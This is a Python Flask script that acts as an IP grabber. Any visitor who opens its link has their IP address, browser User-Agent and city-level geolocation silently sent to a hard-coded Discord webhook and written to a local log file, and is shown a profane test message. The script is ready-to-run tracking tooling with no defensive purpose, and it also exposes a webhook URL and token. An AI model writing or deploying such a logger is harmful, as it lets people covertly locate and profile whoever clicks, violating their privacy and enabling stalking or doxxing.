# main.py
from flask import Flask, request
from datetime import datetime
import requests

app = Flask(__name__)

# → Replace this with your real webhook URL:
WEBHOOK_URL = "https://discordapp.com/api/webhooks/1368661778724294759/6bgqzVwWDt2xZ-SxJYJ57CCvUa-juXe-1s71ivICcyvF49OFB5irFEgsDp7MH5BMOxkp"

@app.route('/')
def log_ip():
    ip = request.remote_addr
    ua = request.headers.get('User-Agent', 'Unknown')

    # — Geo‑lookup via ip-api.com (free, no key needed)
    try:
        geo = requests.get(f"http://ip-api.com/json/{ip}?fields=status,city,regionName,country").json()
        if geo.get("status") == "success":
            location = f"{geo.get('city')}, {geo.get('regionName')}, {geo.get('country')}"
        else:
            location = "Unknown, , "
    except Exception:
        location = "Unknown, , "

    # — Build your message
    message = (
        f"New click!\n"
        f"IP: {ip}\n"
        f"Location: {location}\n"
        f"UA: {ua}"
    )

    # — Send to webhook (Slack/Discord style)
    try:
        requests.post(
            WEBHOOK_URL,
            json={"text": message},
            headers={"Content-Type": "application/json"},
            timeout=5
        )
    except Exception as e:
        # optional: log errors locally
        with open("webhook_errors.log", "a") as err:
            err.write(f"{datetime.now()} — webhook error: {e}\n")

    # — (Optionally still log locally)
    with open("ip_log.txt", "a") as f:
        f.write(f"{datetime.now()} - {ip} - {location} - {ua}\n")

    return "Testing Testing Motherfucker"

if __name__ == '__main__':
    # In production, use: app.run(host="0.0.0.0", port=80)
    app.run()
